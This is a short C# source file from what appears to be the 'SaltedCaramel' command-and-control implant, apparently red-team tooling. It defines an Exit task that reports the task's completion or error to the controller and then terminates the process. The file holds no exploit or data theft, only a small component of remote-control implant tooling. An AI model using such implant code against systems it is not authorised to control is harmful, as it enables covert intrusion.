using System;

namespace SaltedCaramel.Tasks
{
    internal class Exit
    {
        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
        {
            try
            {
                implant.SendComplete(task.id);
            }
            catch (Exception e)
            {
                implant.SendError(task.id, e.Message);
            }
            Environment.Exit(0);

        }
    }
}
